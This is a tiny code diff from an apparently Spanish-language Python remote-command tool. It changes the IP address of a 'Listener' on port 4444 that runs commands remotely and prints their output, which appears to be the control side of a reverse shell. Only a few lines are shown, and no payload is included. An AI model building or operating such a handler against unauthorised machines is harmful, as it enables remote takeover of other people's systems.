@@ -103,5 +103,5 @@ class Listener:
                 result = self.ejecutarRemoto(command)
                 print(result.decode('utf-8', errors='ignore'))
 
-escuchar = Listener("192.168.1.33", 4444)
+escuchar = Listener("10.51.42.221", 4444)
 escuchar.run()
